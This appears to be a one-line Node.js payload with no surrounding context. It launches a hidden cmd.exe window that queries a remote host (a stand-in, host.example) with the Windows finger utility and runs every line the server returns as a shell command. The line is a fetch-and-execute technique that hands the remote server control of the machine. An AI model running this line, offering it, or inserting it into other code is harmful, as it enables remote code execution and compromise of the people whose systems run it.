require('child_process').exec('cmd.exe /c start \"\" /min for /f \"delims=\" %Z in (\'finger user@host.example\') do %Z');
